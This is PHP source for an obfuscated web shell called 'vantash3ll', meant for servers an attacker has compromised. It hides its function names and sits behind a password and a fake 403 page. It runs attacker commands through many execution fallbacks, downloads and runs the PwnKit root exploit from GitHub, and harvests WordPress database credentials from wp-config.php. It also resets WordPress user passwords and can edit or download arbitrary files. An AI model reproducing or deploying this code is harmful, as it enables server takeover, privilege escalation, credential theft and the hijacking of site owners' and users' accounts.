$VANTA67 = count($VANTAarr); for ($i = 0; $i< $VANTA67; $i++) { $VANTAxas[] = unx($VANTAarr[$i]);}
if (!function_exists('_'.'v'.'nt'.'_'.'st'.'r')) { function _vnt_str($arr) { $r = ''; foreach ($arr as $n) $r .= chr($n); return $r; }}
function v4nt4C($pr1VANTA) { $fn = []; $fn[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]); $fn[] = chDxzZ('1'.'01'.','.'12'.'0,1'.'0'.'1,9'.'9'); $fn[] = chDxXZ('7'.'3'.'7'.'97'.'37'.'46'.'5'.'6'.'d'); $fn[] = chDxzZ('112'.',97'.',11'.'5,1'.'15,'.'1'.'16'.',10'.'4,'.'114'.','.'11'.'7'); $fn[] = chDxXZ('7'.'072'.'6f6'.'35f'.'6f'.'70'.'6'.'56e'); $fn[] = chDxzZ([112,111,112,101,110]); $fn[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]); $fn[] = chDxXZ('65'.'73'.'6'.'3'.'617'.'065'.'73'.'68'.'6'.'5'.'6c'.'6c'.'6'.'1'.'726'.'7'); $fn[] = chDxzZ([99,117,114,108,95,101,120,101,99]); $fn[] = chDxzZ('109'.',9'.'7,'.'1'.'05'.',10'.'8'); $fn[] = chDxXZ('636'.'1'.'6c'.'6'.'c5f'.'757'.'365'.'72'.'5f'.'667'.'56e'.'63'); $fn[] = chDxzZ('1'.'02,'.'10'.'5,'.'108'.','.'1'.'0'.'1'.',9'.'5'.','.'10'.'3'.',1'.'01,'.'1'.'1'.'6,9'.'5,9'.'9,'.'1'.'11,'.'11'.'0,'.'116'.',1'.'01,'.'110'.',11'.'6'.',1'.'15'); $fn[] = chDxzZ('1'.'0'.'2,1'.'11,'.'112'.',1'.'0'.'1,'.'11'.'0'); $fn[] = chDxzZ('102'.',1'.'19,'.'1'.'1'.'4,1'.'05'.','.'1'.'16,'.'101'); $fn[] = chDxzZ('10'.'2'.',99'.',10'.'8,1'.'11,'.'11'.'5'.',10'.'1'); $fn[] = chDxzZ('11'.'2,'.'11'.'7,'.'1'.'16'.',1'.'0'.'1,1'.'10'.',1'.'1'.'8'); $fn[] = chDxzZ('105'.','.'1'.'10,'.'105'.','.'95'.','.'11'.'5,1'.'01'.',11'.'6'); $fn[] = chDxzZ([112,99,110,116,108,95,101,120,101,99]); $fn[] = chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118]); $fn[] = chDxzZ([109,113,95,111,112,101,110]); $fn[] = chDxzZ([103,99,95,111,112,101,110]); $out = false; for ($i = 0; $i< count($fn); $i++) { $f = $fn[$i]; if (!function_exists($f)) continue; if ($f === chDxzZ([115,104,101,108,108,95,101,120,101,99])) { $out = @$f($pr1VANTA); if (!empty($out)) break; } elseif ($f === chDxzZ('101'.','.'12'.'0,1'.'01,'.'9'.'9')) { $lines = []; @$f($pr1VANTA, $lines); $out = join("\n", $lines); if (!empty($out)) break; } elseif ($f === chDxXZ('7'.'379'.'73'.'7'.'46'.'5'.'6d')) { ob_start(); @$f($pr1VANTA); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxzZ('112'.',97'.',1'.'15'.',1'.'1'.'5,'.'116'.','.'104'.',11'.'4,'.'11'.'7')) { ob_start(); @$f($pr1VANTA); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('70'.'72'.'6f'.'63'.'5'.'f6'.'f7'.'06'.'56'.'e')) { $d = [1=>["pipe","w"],2=>["pipe","w"]]; $p = @$f($pr1VANTA, $d, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (!empty($out)) break; } } elseif ($f === chDxzZ([112,111,112,101,110])) { $h = @$f($pr1VANTA . " 2>&1", "r"); $res = ""; if ($h) { while (!feof($h)) $res .= fread($h, 4096); pclose($h); } if (strlen($res)) { $out = $res; break; } } elseif ($f === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) { $esc = $f($pr1VANTA); ob_start(); @system($esc); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('6'.'573'.'6'.'36'.'17'.'065'.'73'.'68'.'65'.'6'.'c6'.'c6'.'17'.'26'.'7')) { $esc = $f($pr1VANTA); $out = @chDx2x($esc); if (!empty($out)) break; } elseif ($f === chDxzZ([99,117,114,108,95,101,120,101,99])) { $ch = @curl_init('f'.'i'.'le'.':/'.'/'.'/p'.'roc'.'/se'.'l'.'f/c'.'mdl'.'i'.'ne'); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); @curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1VANTA); $r = @curl_exec($ch); @curl_close($ch); if ($r && strpos($r, $pr1VANTA) !== false) { $out = $r; break; } } elseif ($f === chDxzZ('10'.'9'.',9'.'7,'.'1'.'05'.',1'.'08')) { $to = uniqid()."@".uniqid().".xyz"; @mail($to, $pr1VANTA, $pr1VANTA); $out = ""; } elseif ($f === chDxXZ('63'.'616'.'c6c'.'5'.'f75'.'7'.'36'.'572'.'5f'.'667'.'56'.'e6'.'3')) { $shellfunc = chDxzZ([115,104,101,108,108,95,101,120,101,99]); if (function_exists($shellfunc)) { $out = @call_user_func($shellfunc, $pr1VANTA); if (!empty($out)) break; }} elseif ($f === chDxzZ('102'.',1'.'05,'.'1'.'0'.'8,'.'101'.',9'.'5,1'.'03'.','.'10'.'1,'.'116'.',9'.'5,'.'99,'.'11'.'1'.',11'.'0,'.'11'.'6,1'.'01'.','.'1'.'10'.','.'116'.',1'.'15')) { $r = @$f("php://filter/read=convert.base64-encode/resource=" . $pr1VANTA); if ($r && strlen($r) >0) { $out = $r; break; } } elseif ($f === chDxzZ('102'.',1'.'1'.'1,1'.'12,'.'1'.'01,'.'11'.'0')) { $tmpf = sys_get_temp_dir() . "/" . uniqid("s-cmd") . ".sh"; $h = @$f($tmpf, "w"); if ($h) { fwrite($h, $pr1VANTA); fclose($h); } $r = @chDx2x("sh " . escapeshellarg($tmpf) . " 2>&1"); if ($r) { $out = $r; @unlink($tmpf); break; } } elseif ($f === chDxzZ('1'.'12,'.'1'.'1'.'7,'.'116'.',1'.'0'.'1,'.'1'.'10'.','.'11'.'8')) { @putenv("CMD=".$pr1VANTA); $r = @getenv("CMD"); if ($r == $pr1VANTA) { $out = $r; break; } } elseif ($f === chDxzZ('10'.'5'.','.'1'.'1'.'0,1'.'05,'.'95'.','.'1'.'15,'.'101'.',11'.'6')) { @ini_set("auto_prepend_file", $pr1VANTA); $out = @file_get_contents($_SERVER['SCR'.'IPT'.'_F'.'I'.'LEN'.'AME']); if (!empty($out)) break; } elseif ($f === chDxzZ([112,99,110,116,108,95,101,120,101,99])) { @pcntl_exec("/bin/sh", array("-c", $pr1VANTA)); } elseif ($f === chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118])) { @apache_setenv("CMD", $pr1VANTA); $out = getenv("CMD"); if ($out == $pr1VANTA) break; } elseif ($f === chDxzZ([109,113,95,111,112,101,110]) || $f === chDxzZ([103,99,95,111,112,101,110])) { } } return $out !== false ? $out : false;}if (!function_exists('ch'.'D'.'xz'.'Z')) { function chDxzZ($arr) { if (is_string($arr)) $arr = explode(',', $arr); $r = ''; foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n)); return $r; }}
if (!function_exists('p'.'r'.'vdy'.'z'.'h'.'s'.'ax')) { function prvdyzhsax($str) { $y = ''; for ($i = 0; $i< strlen($str); $i++) $y .= dechex(ord($str[$i])); return $y; }}
if (!function_exists('ch'.'D'.'x'.'XZ')) { function chDxXZ($hx) { $n = ''; for ($i = 0; $i< strlen($hx) - 1; $i += 2) $n .= chr(hexdec($hx[$i] . $hx[$i + 1])); return $n; }}
if (isset($_GET['VAN'.'TA'])) { $cdir = unx($_GET['VAN'.'T'.'A']); if (@is_dir($cdir)) { $VANTAxas[14]($cdir); } else { } } else { $cdir = $VANTAxas[0](); }
function VANTAd0($file) { if (file_exists($file)) { header('C'.'o'.'nt'.'e'.'nt'.'-'.'D'.'es'.'cri'.'p'.'tio'.'n:'.' '.'Fil'.'e T'.'r'.'an'.'s'.'f'.'er'); header('C'.'on'.'t'.'e'.'nt-'.'Typ'.'e'.': '.'ap'.'p'.'lic'.'at'.'io'.'n/o'.'cte'.'t-s'.'tr'.'e'.'a'.'m'); header('Co'.'n'.'ten'.'t'.'-'.'Dis'.'pos'.'it'.'ion'.':'.' at'.'t'.'ac'.'hme'.'nt'.'; '.'f'.'i'.'l'.'ena'.'me'.'=' . basename($file)); header('Co'.'nte'.'nt-'.'Tr'.'ans'.'fer'.'-'.'E'.'nco'.'din'.'g: '.'bi'.'n'.'a'.'r'.'y'); header('Ex'.'pir'.'es'.': '.'0'); header('Ca'.'che'.'-Co'.'ntr'.'o'.'l:'.' m'.'us'.'t'.'-re'.'v'.'al'.'i'.'d'.'at'.'e'); header('Pra'.'gma'.':'.' pu'.'bl'.'i'.'c'); header('Con'.'te'.'nt-'.'Len'.'gth'.': ' . filesize($file)); ob_clean(); flush(); readfile($file); exit; }}
if (!empty($_GET['d'.'o'.'n'])) {$FilesDon = VANTAd0(unx($_GET['d'.'on']));}

$auth_pass = "23b43d2781b44e6eb2659b3701a59e5632e3fddb97a717c919df92be032fadce";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (apache v.168 Nginx) </center>
...
<head>
    ...
    <title>vantash3ll - <?= $_SERVER['SE'.'RV'.'ER'.'_'.'NA'.'M'.'E']; ?></title>
...
<?php
function formatMemory($bytes) { if ($bytes === 'N/'.'A') return 'N'.'/A'; $units = ['B', 'K'.'B', 'M'.'B', 'G'.'B', 'T'.'B']; $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, 2) . ' ' . $units[$pow];}
function g3tdbX() { $d1sxb = ini_get('dis'.'ab'.'le_'.'f'.'unc'.'ti'.'on'.'s'); if (empty($d1sxb)) { return array(); } return explode(',', $d1sxb);}
...
<div class="privcontent flex-1 overflow-auto">
       <div class="p-6">
<?php if (isset($_GET['v4n'.'t4'.'_a'.'uto'.'_r'.'00'.'t'])): ?>
<?php
session_start();
if (!isset($_SESSION['va'.'nt'.'a'.'sh3'.'ll'.'_'.'r'.'0'.'0t'.'_'.'sta'.'tus'])) $_SESSION['va'.'nta'.'s'.'h3l'.'l_'.'r0'.'0t_'.'sta'.'t'.'us'] = 'us'.'e'.'r';
if (!isset($_SESSION['v'.'an'.'tas'.'h3l'.'l'.'_r0'.'0t'.'_'.'lo'.'g'])) $_SESSION['van'.'t'.'ash'.'3ll'.'_r0'.'0'.'t'.'_lo'.'g'] = [];
function vantash3ll_log($msg) {
    $_SESSION['v'.'an'.'tas'.'h3l'.'l'.'_r0'.'0t'.'_l'.'o'.'g'][] = $msg;
    if (count($_SESSION['van'.'ta'.'sh3'.'ll_'.'r0'.'0t'.'_l'.'og']) > 20) array_shift($_SESSION['v'.'ant'.'a'.'s'.'h3'.'ll_'.'r00'.'t_'.'log']);
}
function vantash3ll_download_pwnkit() {
    if (!file_exists('p'.'wnk'.'it')) {
        vantash3ll_log("[*] Trying wget for pwnkit...");
        $wget = v4nt4C('w'.'get'.' -q'.' -O'.' '.'pwn'.'k'.'i'.'t h'.'ttp'.'s:/'.'/'.'g'.'ith'.'ub.'.'c'.'om'.'/'.'l'.'y'.'4k/'.'Pw'.'n'.'Ki'.'t'.'/'.'raw'.'/m'.'a'.'i'.'n/'.'P'.'w'.'nK'.'i'.'t');
        clearstatcache();
        if (!file_exists('pw'.'n'.'k'.'it') || filesize('pw'.'nki'.'t') < 10000) {
            vantash3ll_log("[*] wget failed or file too small. Trying curl...");
            $curl = v4nt4C('cu'.'r'.'l -'.'sL'.' -'.'-'.'out'.'put'.' pw'.'nki'.'t'.' '.'htt'.'p'.'s:'.'//g'.'ith'.'ub.'.'co'.'m/l'.'y4k'.'/Pw'.'nK'.'it/'.'raw'.'/'.'m'.'ai'.'n/P'.'wnK'.'i'.'t');
            clearstatcache();
            if (!file_exists('pw'.'nk'.'it') || filesize('pw'.'nki'.'t') < 10000) {
...
function vantash3ll_try_root() {
    $_SESSION['van'.'ta'.'sh3'.'l'.'l_'.'r0'.'0t'.'_s'.'ta'.'t'.'u'.'s'] = 'us'.'e'.'r';
    $_SESSION['van'.'t'.'a'.'sh'.'3ll'.'_'.'r00'.'t_l'.'o'.'g'] = [];
    vantash3ll_log("[*] [AUTO-ROOT] Detecting current user...");
    $id = trim(v4nt4C('i'.'d'));
    vantash3ll_log("[*] User: $id");
    if (strpos($id, 'ui'.'d'.'=0('.'roo'.'t)') !== false) {
        $_SESSION['v'.'an'.'ta'.'s'.'h'.'3l'.'l_r'.'00'.'t'.'_s'.'ta'.'tus'] = 'ro'.'ot';
        vantash3ll_log("[+] Already ROOT.");
        return;
    }
    if (vantash3ll_download_pwnkit()) {
        if (file_exists('pwn'.'k'.'i'.'t')) {
            vantash3ll_log("[*] Running pwnkit for root session...");
            @unlink('.'.'pri'.'vda'.'yz'.'-r'.'o'.'o'.'t');
            v4nt4C('./'.'pw'.'n'.'ki'.'t '.'"id'.'" >'.' .p'.'r'.'i'.'vda'.'y'.'z-r'.'oot');
            usleep(350000);
            $res = @file_get_contents('.p'.'ri'.'vda'.'y'.'z-r'.'oo'.'t');
            if ($res && strpos($res, 'ui'.'d'.'=0('.'r'.'o'.'ot)') !== false) {
                $_SESSION['va'.'nt'.'ash'.'3l'.'l_'.'r00'.'t_s'.'ta'.'t'.'us'] = 'roo'.'t';
  ...
  <div class="vanta-cmd-header" style="display:flex;align-items:center;gap:11px;">
    ...
    <div>
      <div class="vanta-cmd-title" style="font-size:1.2em;">
        v4nt4 auto r00t
        <?php if ($_SESSION['v'.'ant'.'a'.'sh'.'3ll'.'_r'.'00t'.'_st'.'at'.'us'] === 'r'.'oo'.'t'): ?>
...
if (!empty($_SESSION['v'.'a'.'n'.'ta'.'sh3'.'ll_'.'r0'.'0t'.'_l'.'o'.'g'])) {
    foreach ($_SESSION['van'.'t'.'a'.'sh'.'3'.'ll_'.'r'.'00'.'t_l'.'o'.'g'] as $l) {
...
?></pre>
    <form method="post" id="vanta-cmd-form">
      <div class="vanta-cmd-inputbox" style="margin-bottom:17px;">
        <input type="text" class="vanta-cmd-cmdinput" name="vanta-cmd_cmd" value="<?= htmlspecialchars($_POST['v'.'ant'.'a-c'.'md_'.'cm'.'d'] ?? 'i'.'d') ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
      </div>
...
if ($_SERVER['RE'.'QUE'.'S'.'T_'.'ME'.'TH'.'OD'] === 'P'.'OS'.'T' && isset($_POST['va'.'nt'.'a-'.'cmd'.'_'.'c'.'m'.'d'])) {
    $c = $_POST['va'.'nt'.'a'.'-'.'cmd'.'_cm'.'d'];
    $is_root = false;
    if (file_exists('.p'.'r'.'ivd'.'ay'.'z-r'.'oot')) {
        $res = @file_get_contents('.pr'.'ivd'.'ayz'.'-ro'.'ot');
        if ($res && strpos($res, 'uid'.'=0'.'(ro'.'ot'.')') !== false) $is_root = true;
    }
    if ($is_root && file_exists('pwn'.'kit')) {
        @unlink('.'.'p'.'ri'.'v'.'da'.'yz'.'-r'.'o'.'ot2');
        v4nt4C('.'.'/pw'.'n'.'ki'.'t "' . addslashes($c) . ' '.'2>'.'&1"'.' > '.'.pr'.'ivd'.'ayz'.'-ro'.'ot2');
        usleep(350000);
...
<?php elseif (isset($_GET['wp'.'_V'.'A'.'NTA'.'d0'.'0r'])): ?>
<script>
...
function wp_find_paths($max=99) {
    ...
    $cwd = getcwd();
    $roots[] = $cwd;
    if (isset($_SERVER['D'.'OC'.'U'.'M'.'E'.'NT'.'_RO'.'O'.'T']) && $_SERVER['DOC'.'UME'.'NT'.'_'.'ROO'.'T'] && $_SERVER['DOC'.'UME'.'NT'.'_RO'.'O'.'T']!=$cwd)
     $roots[] = $_SERVER['DO'.'CUM'.'EN'.'T_'.'ROO'.'T'];
    $roots[] = dirname($cwd);
    foreach(['/'.'ho'.'m'.'e','/ho'.'me'.'1','/ho'.'me'.'2','/'.'h'.'ome'.'3','/'.'var'.'/'.'w'.'ww','/va'.'r/'.'ww'.'w/v'.'ho'.'sts','/'.'us'.'r/'.'sh'.'ar'.'e'.'/'.'ng'.'inx'.'/'.'h'.'t'.'ml','/sr'.'v/w'.'ww','/s'.'rv/'.'ht'.'tp','/'.'d'.'ata'.'/'.'we'.'b','/op'.'t/'.'lam'.'pp'.'/ht'.'doc'.'s','/'.'h'.'tdo'.'cs','/'.'us'.'e'.'r'.'s'] as $root)
    ...
    $roots = array_unique(array_filter($roots,'is_'.'dir'));
    $queue = [];
    ...
    while($queue && count($found)<$max) {
     ...
     $scanned[$dir]=1;
     if ((file_exists($dir.'/wp'.'-lo'.'a'.'d'.'.'.'php')||file_exists($dir.'/wp'.'-co'.'nf'.'ig'.'.'.'p'.'hp')) && is_file($dir.'/'.'wp'.'-co'.'n'.'f'.'ig.'.'ph'.'p')) {
       $found[] = realpath($dir);
     }
     if ($lvl<6) {
...
function wp_get_db_config($wp_dir) {
    $cfgf = $wp_dir.'/w'.'p-c'.'on'.'fi'.'g.p'.'hp';
    if (!is_file($cfgf)) return false;
    $cfg = @file_get_contents($cfgf);
    $info = [];
    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $cfg, $m); $info['d'.'b'] = $m[1] ?? '';
    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'/", $cfg, $m); $info['use'.'r'] = $m[1] ?? '';
    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'/", $cfg, $m); $info['p'.'as'.'s'] = $m[1] ?? '';
    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $cfg, $m); $info['ho'.'s'.'t'] = $m[1] ?? '';
    preg_match("/\$table_prefix\s*=\s*'([^']+)'/", $cfg, $m); $info['pre'.'fi'.'x'] = $m[1] ?? 'w'.'p_';
    return $info;
}
function wp_get_version($wp_dir) {
    $ver = '';
    if (is_file($wp_dir.'/w'.'p-i'.'n'.'c'.'lu'.'des'.'/'.'v'.'er'.'si'.'o'.'n'.'.'.'ph'.'p')) {
     $vcode = @file_get_contents($wp_dir.'/'.'w'.'p'.'-'.'i'.'ncl'.'ud'.'es'.'/ve'.'rs'.'io'.'n.'.'php');
...
function wp_fetch_users($mysqli, $prefix) {
    ...
    while ($row = $res->fetch_assoc()) {
     $meta = @$mysqli->query("SELECT meta_value FROM {$prefix}usermeta WHERE user_id=".$row['I'.'D']." AND meta_key='{$prefix}capabilities'")->fetch_assoc();
     $role = '';
     if ($meta && preg_match('/s:'.'\\d'.'+:"'.'('.'[^'.'"'.']+)'.'"/', $meta['me'.'t'.'a_v'.'a'.'l'.'u'.'e'], $m))
       $role = $m[1];
     else $role = 'u'.'n'.'k'.'now'.'n';
     $row['ro'.'le'] = $role;
     $users[] = $row;
    }
    return $users;
...
if (!$wp_dirs) {
    echo '<'.'d'.'iv'.' cl'.'ass'.'="w'.'p'.'_V'.'A'.'NTA'.'d'.'00r'.'-al'.'e'.'rt"'.'>N'.'o'.' '.'Wor'.'d'.'P'.'re'.'ss'.' d'.'et'.'e'.'cte'.'d ('.'a'.'l'.'l '.'dir'.'s s'.'can'.'ned'.').<'.'/di'.'v'.'>';
}

if ($_SERVER['REQ'.'U'.'ES'.'T_'.'MET'.'HO'.'D']=='PO'.'S'.'T' && isset($_POST['wp_'.'dir'])) {
    $wp_dir = $_POST['wp_'.'d'.'ir'];
    $cfg = wp_get_db_config($wp_dir);
    $db = $cfg['d'.'b'] ?? ''; $user = $cfg['use'.'r'] ?? ''; $pass = $cfg['p'.'a'.'ss'] ?? '';
    $host = $cfg['hos'.'t'] ?? 'loc'.'al'.'h'.'os'.'t'; $prefix = $cfg['p'.'ref'.'ix'] ?? 'w'.'p_';
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_errno) {
     echo "<script>showAlert('[FAIL] DB Connect: ".htmlspecialchars($mysqli->connect_error)."','fail');</script>"; exit;
    }
    if (isset($_POST['r'.'e'.'set'.'_p'.'w'], $_POST['re'.'s'.'et'.'_ui'.'d'], $_POST['ne'.'w'.'pw'])) {
     $uid = intval($_POST['re'.'s'.'et'.'_ui'.'d']);
     $newpw = trim($_POST['n'.'e'.'wpw']);
...
foreach ($wp_dirs as $wp_dir):
    $cfg = wp_get_db_config($wp_dir);
    $db = $cfg['d'.'b'] ?? ''; $user = $cfg['u'.'se'.'r'] ?? ''; $pass = $cfg['p'.'as'.'s'] ?? '';
    $host = $cfg['ho'.'st'] ?? 'l'.'oca'.'l'.'hos'.'t'; $prefix = $cfg['pre'.'fi'.'x'] ?? 'w'.'p_';
    $wp_version = wp_get_version($wp_dir);

    echo '<d'.'iv'.' cl'.'a'.'s'.'s="'.'w'.'p_'.'V'.'AN'.'T'.'Ad0'.'0'.'r'.'-si'.'t'.'e">';
    echo '<di'.'v '.'cl'.'a'.'s'.'s="'.'w'.'p'.'_V'.'ANT'.'A'.'d00'.'r-'.'hea'.'d'.'e'.'r">';
    echo '<'.'spa'.'n '.'cl'.'a'.'s'.'s='.'"w'.'p_'.'VA'.'N'.'T'.'A'.'d'.'00r'.'-p'.'a'.'th"'.'><i'.' cl'.'ass'.'='.'"fa'.'b f'.'a'.'-'.'wor'.'dp'.'res'.'s'.'"'.'></'.'i'.'> '.htmlspecialchars($wp_dir).'</s'.'p'.'an'.'>';
    if ($wp_version) echo '<sp'.'a'.'n c'.'las'.'s='.'"wp'.'_V'.'A'.'NTA'.'d'.'00r'.'-v'.'e'.'rs'.'ion'.'">'.'WP'.' '.$wp_version.'</s'.'pa'.'n'.'>';
    echo '<sp'.'an'.' '.'c'.'la'.'ss='.'"w'.'p_V'.'AN'.'T'.'A'.'d00'.'r-'.'db'.'inf'.'o'.'">'.'
'.'   '.' '.'<'.'b>h'.'0s'.'t:<'.'/'.'b> '.htmlspecialchars($host).' '.'<'.'b>'.'db_'.'u'.'s'.'e'.'r'.':<'.'/'.'b'.'>'.' '.htmlspecialchars($user).' <'.'b>d'.'b_'.'pw'.':<'.'/b>'.' '.htmlspecialchars($user).' <'.'b>'.'db:'.'</b'.'> '.htmlspecialchars($db).' <'.'b>'.'pre'.'f1x'.':'.'<'.'/b>'.' '.$prefix.'
'.'
'.'  '.'  <'.'/sp'.'an>';
    echo '</'.'d'.'iv'.'>';
    ...
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_errno) {
     echo '<'.'div'.' '.'cla'.'ss'.'="'.'w'.'p'.'_VA'.'NT'.'A'.'d'.'00'.'r-'.'ale'.'rt"'.' st'.'y'.'le='.'"co'.'lo'.'r'.':#e'.'5'.'393'.'5;'.'">'.'D'.'B E'.'r'.'ror'.': '.htmlspecialchars($mysqli->connect_error).'</'.'div'.'>';
     echo '</d'.'i'.'v'.'>'; continue;
    }
    $users = wp_fetch_users($mysqli, $prefix);
    $site_url = get_site_url($mysqli, $prefix);
    echo '<'.'div'.' cl'.'as'.'s='.'"wp'.'_V'.'A'.'N'.'TA'.'d00'.'r-u'.'se'.'rs'.'">'.'<'.'ta'.'ble'.'>'.'<t'.'r'.'>'.'
'.'   '.' <t'.'h>'.'ID'.'</t'.'h>'.'<th'.'>us'.'e'.'r'.'</'.'th'.'><'.'th'.'>e'.'mai'.'l<'.'/'.'th>'.'<t'.'h>r'.'ol'.'e'.'</'.'th'.'>'.'<'.'th'.'>'.'r'.'es'.'et '.'pw'.'</'.'th'.'><'.'th>'.'w'.'p-'.'log'.'in'.'</t'.'h>'.'<'.'/'.'t'.'r>';
    foreach ($users as $u) {
     $pw_val = "privdayz".rand(100,999);
     echo '<t'.'r'.'>'.'
'.'   '.'   '.' '.'<'.'td'.'>'.$u['I'.'D'].'</t'.'d'.'>
'.'
  '.'   '.' '.' <t'.'d'.'>'.htmlspecialchars($u['u'.'se'.'r_'.'l'.'o'.'gin']).'</t'.'d'.'>'.'
'.'   '.'  '.'  <'.'t'.'d>'.htmlspecialchars($u['u'.'se'.'r'.'_'.'em'.'ail']).'</t'.'d>
'.'
'.'  '.'  '.'   '.'<'.'td'.'>'.$u['r'.'ol'.'e'].'</'.'td>'.'
'.'   '.'  '.'  <'.'td>'.'
'.'
 '.' '.'   '.'   '.'  '.'<'.'for'.'m m'.'eth'.'o'.'d="'.'pos'.'t'.'" s'.'t'.'yle'.'="d'.'isp'.'l'.'ay'.':'.'i'.'nli'.'ne'.';"'.'>
'.'  '.'  '.' '.'   '.'  <'.'i'.'n'.'put'.' t'.'y'.'p'.'e='.'"hi'.'d'.'d'.'en'.'"'.' n'.'a'.'me='.'"w'.'p'.'_di'.'r" '.'va'.'lue'.'="'.htmlspecialchars($wp_dir).'">'.'
'.'   '.'   '.'   '.' <'.'in'.'pu'.'t t'.'ype'.'='.'"h'.'idd'.'en'.'" '.'n'.'ame'.'="r'.'e'.'s'.'et_'.'u'.'id'.'"'.' '.'va'.'lue'.'='.'"'.$u['I'.'D'].'">
'.'
 '.' '.'   '.'  '.'  '.' <i'.'npu'.'t'.' ty'.'pe'.'="t'.'e'.'xt"'.' n'.'a'.'m'.'e'.'="n'.'ewp'.'w" '.'val'.'u'.'e="'.$pw_val.'" '.'cla'.'s'.'s="'.'wp'.'_VA'.'NTA'.'d00'.'r-p'.'w" '.'s'.'t'.'yl'.'e="'.'wi'.'dt'.'h:9'.'4px'.';">'.'
'.'
 '.'  '.'  '.'   '.' '.' '.'<'.'bu'.'t'.'to'.'n'.' n'.'a'.'m'.'e="'.'res'.'e'.'t_'.'p'.'w'.'" c'.'l'.'ass'.'="w'.'p_'.'V'.'AN'.'TA'.'d'.'0'.'0r'.'-bt'.'n w'.'p'.'_V'.'ANT'.'Ad'.'0'.'0'.'r-b'.'tn-'.'g'.'ree'.'n"'.'>r'.'es'.'e'.'t<'.'/bu'.'tt'.'on'.'>
'.'
 '.' '.' '.' '.'  '.'  '.'  '.'<b'.'ut'.'t'.'on'.' '.'t'.'yp'.'e='.'"bu'.'tto'.'n"'.' cl'.'ass'.'='.'"wp'.'_VA'.'N'.'TAd'.'00r'.'-b'.'tn'.' w'.'p_'.'VA'.'N'.'TA'.'d'.'00'.'r-b'.'t'.'n-'.'cop'.'y'.'"'.' '.'on'.'c'.'l'.'i'.'ck='.'"co'.'py'.'Tex'.'t(t'.'his'.'.p'.'rev'.'i'.'ous'.'Ele'.'men'.'tS'.'ibl'.'i'.'n'.'g.v'.'a'.'lue'.','.' '.'thi'.'s)"'.'>c'.'opy'.'</b'.'u'.'t'.'t'.'o'.'n>
'.'
  '.' '.' '.'   '.'  '.' </'.'fo'.'rm'.'>
'.'
'.'   '.' '.'   '.'</'.'t'.'d'.'>
...
'.'  '.' '.'   '.' <t'.'d'.'>';
     if ($site_url) {
       $login_url = htmlspecialchars($site_url . '/wp'.'-lo'.'gin'.'.'.'p'.'h'.'p?'.'l'.'og=' . urlencode($u['us'.'er'.'_l'.'ogi'.'n']));
       echo '<a'.' hr'.'ef='.'"'.$login_url.'"'.' cl'.'a'.'s'.'s="'.'wp_'.'VAN'.'TA'.'d00'.'r-b'.'tn '.'wp_'.'VAN'.'TAd'.'00r'.'-b'.'tn-'.'gr'.'een'.'" t'.'arg'.'et='.'"_'.'bl'.'a'.'nk'.'"'.'>'.'l'.'og'.'in'.'</'.'a>';
     } else {
       echo '<'.'s'.'pan'.' cl'.'as'.'s='.'"'.'wp'.'_VA'.'N'.'T'.'Ad'.'0'.'0'.'r'.'-al'.'e'.'rt'.'"'.'>'.'n'.'o '.'si'.'te'.' u'.'rl'.'<'.'/s'.'pan'.'>';
     }
     echo '</t'.'d'.'>'.'
 '.' '.' '.' '.' <'.'/tr'.'>';
    }
...
if (is_file($file_path)) {
  ...
  if (!mb_check_encoding($file_raw, 'UT'.'F-'.'8')) {
    $file_raw = mb_convert_encoding($file_raw, 'UT'.'F-8', 'ISO'.'-8'.'85'.'9'.'-1,'.'Win'.'d'.'ows'.'-12'.'54'.',UT'.'F'.'-8');
  }
}
$edit_result = '';
  if ($_SERVER['RE'.'QUE'.'ST_'.'ME'.'THO'.'D']=='P'.'O'.'S'.'T' && isset($_POST['s'.'ave'.'-e'.'di'.'to'.'r'])) {
    $target = $file_path;
    $code = $_POST['cod'.'e-e'.'dit'.'o'.'r'];
    $ok = false;
    if (function_exists('fi'.'le_'.'put'.'_co'.'n'.'t'.'en'.'t'.'s')) $ok = @file_put_contents($target, $code) !== false;
    if (!$ok && function_exists('fo'.'pen')) {
      $h = @fopen($target, 'w');
      if ($h) { @fwrite($h, $code); @fclose($h); $ok = true; }
    }
    if (!$ok && function_exists('v4n'.'t'.'4C')) {
    ...
    if (is_file($file_path)) {
      ...
      if (!mb_check_encoding($file_raw, 'UTF'.'-8')) {
        $file_raw = mb_convert_encoding($file_raw, 'U'.'TF'.'-8', 'ISO'.'-8'.'85'.'9'.'-'.'1,W'.'in'.'dow'.'s-1'.'25'.'4,'.'U'.'TF'.'-'.'8');
      }
    }
  }
?>
...
<?php elseif (isset($_GET['s'.'y'.'ml'.'in'.'k'])): ?>
...
function g3t_rnd($n=6) {
  $c='a'.'b'.'cde'.'fgh'.'ij'.'k'.'l'.'mn'.'op'.'qrs'.'t'.'uv'.'w'.'x'.'y'.'z'.'01'.'234'.'567'.'8'.'9'; $r='';
...
if (isset($_POST['v'.'n'.'t'.'_go'], $_POST['vnt'.'_'.'inp'.'u'.'t']) && trim($_POST['v'.'nt_'.'inp'.'ut'])) {
  $p1 = trim($_POST['v'.'n'.'t_i'.'n'.'pu'.'t']);
